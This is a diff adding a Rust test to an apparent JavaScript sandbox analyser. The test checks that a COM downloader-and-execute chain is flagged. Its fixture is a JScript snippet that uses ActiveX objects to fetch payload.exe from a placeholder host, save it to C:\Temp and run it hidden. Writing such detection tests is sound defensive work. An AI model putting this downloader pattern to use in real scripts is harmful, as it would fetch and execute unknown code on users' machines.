@@ -158,6 +158,38 @@ fn sandbox_flags_telemetry_budget_saturation() {
 
 #[cfg(feature = "js-sandbox")]
 #[test]
+fn sandbox_flags_com_downloader_execution_chain() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+        xhr.open('GET', 'http://example.invalid/payload.exe', false);
+        xhr.send();
+        var stream = new ActiveXObject('ADODB.Stream');
+        stream.Open();
+        stream.Write('MZ');
+        stream.SaveToFile('C:\\Temp\\payload.exe', 2);
+        stream.Close();
+        var shell = new ActiveXObject('WScript.Shell');
+        shell.Run('C:\\Temp\\payload.exe', 0, false);
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "com_downloader_execution_chain"),
+                "expected COM downloader execution pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
 fn sandbox_omits_delta_summary_without_dynamic_code() {
     let options = DynamicOptions::default();
     let outcome = js_analysis::run_sandbox(b"app.alert('hello')", &options);
